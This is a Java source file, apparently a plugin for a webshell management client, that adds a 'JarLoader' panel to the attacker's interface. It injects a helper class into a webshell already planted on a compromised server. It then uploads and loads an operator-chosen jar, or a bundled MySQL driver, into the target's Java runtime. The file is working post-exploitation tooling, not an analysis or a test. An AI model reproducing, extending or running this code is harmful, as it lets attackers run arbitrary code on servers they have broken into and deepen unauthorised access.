package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.GBC;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "JarLoader")
public class JarLoader implements Plugin {

    private static final String CLASS_NAME = "plugin.JarLoader";
    private static final String[] DB_JARS = {"mysql"};

    private JPanel panel;

    private JComboBox<String> jarComboBox;

    private JButton loadJarButton;
    private JButton selectJarButton;
    private JButton loadDbJarButton;
    private JLabel jarFileLabel;
    private JTextField jarTextField;
    private JSplitPane meterpreterSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public JarLoader() {
        this.panel = new JPanel(new BorderLayout());

        this.jarFileLabel = new JLabel("JarFile: ");
        this.loadJarButton = new JButton("LoadJar");
        this.loadDbJarButton = new JButton("LoadDbJar");
        this.selectJarButton = new JButton("select Jar");
        this.jarTextField = new JTextField(30);
        this.jarComboBox = new JComboBox(DB_JARS);
        this.meterpreterSplitPane = new JSplitPane();
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);

        JPanel TopPanel = new JPanel();
        TopPanel.add(this.jarFileLabel);
        TopPanel.add(this.jarTextField);
        TopPanel.add(this.selectJarButton);
        TopPanel.add(this.loadJarButton);
        JPanel bottomPanel = new JPanel(new GridBagLayout());
        GBC gbcJarCommbox = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
        GBC gbcLoadDb = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
        bottomPanel.add(this.jarComboBox, gbcJarCommbox);
        bottomPanel.add(this.loadDbJarButton, gbcLoadDb);

        this.meterpreterSplitPane.setTopComponent(TopPanel);
        this.meterpreterSplitPane.setBottomComponent(bottomPanel);
        this.panel.add(this.meterpreterSplitPane);
    }

    private void selectJarButtonClick(ActionEvent actionEvent) {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter("*.jar", "jar"));
        chooser.setFileSelectionMode(0);
        chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        if (selectdFile != null) {
            this.jarTextField.setText(selectdFile.getAbsolutePath());
        } else {
            Log.log("用户取消选择.....");
        }
    }

    private void loadJarButtonClick(ActionEvent actionEvent) {
        try {
            File jarFile = new File(this.jarTextField.getText());
            InputStream inputStream = new FileInputStream(jarFile);
            byte[] jarByteArray = functions.readInputStream(inputStream);
            inputStream.close();
            JOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    private void loadDbJarButtonClick(ActionEvent actionEvent) {
        try {
            InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.jar", this.jarComboBox.getSelectedItem()));
            byte[] jarByteArray = functions.readInputStream(inputStream);
            inputStream.close();
            JOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/JarLoader.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private String loadJar(byte[] jarByteArray) {
        load();
        ReqParameter praameter = new ReqParameter();
        praameter.add("jarByteArray", jarByteArray);
        String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", praameter));
        Log.log(resultString);
        return resultString;
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

}
